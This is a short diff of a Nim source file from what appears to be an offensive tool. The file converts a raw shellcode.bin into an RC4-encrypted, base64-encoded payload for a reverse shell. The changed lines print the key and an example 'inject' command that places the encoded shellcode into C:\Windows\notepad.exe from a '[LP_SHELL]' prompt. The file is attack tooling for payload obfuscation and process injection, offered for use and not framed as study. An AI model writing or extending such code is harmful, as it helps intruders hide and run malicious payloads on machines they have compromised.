@@ -1,6 +1,4 @@
-#[
-  - For converting raw shellcode files
-]#
+#[ Converter for a raw shellcode.bin file for use in the reverse shell ]#
 
 import os
 import core/rc_for
@@ -19,9 +17,9 @@ when isMainModule:
   var encrypted: string = trcEnc(key, shellCode)
   var encShellCode: seq[byte] = toByteSeq(encrypted)
   var b64enc = encode(encShellCode)
-  echo "[Method 1] Key: In the toml config"
-  echo "           SC: In the toml config\n"
-  echo "[Method 2] Key: In the toml config"
-  echo "           SC: Paste with the inject command in the reverse shell\n"
+  echo "Key used: ", key 
+  echo "Ensure this key is set at the top of the reverse shell file\n"
+  echo "SC: Paste with the inject command in the reverse shell"
+  echo "Example: [LP_SHELL] > inject C:\\Windows\\notepad.exe ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=\n"
   echo "[+] Copy/paste: ", b64enc
 
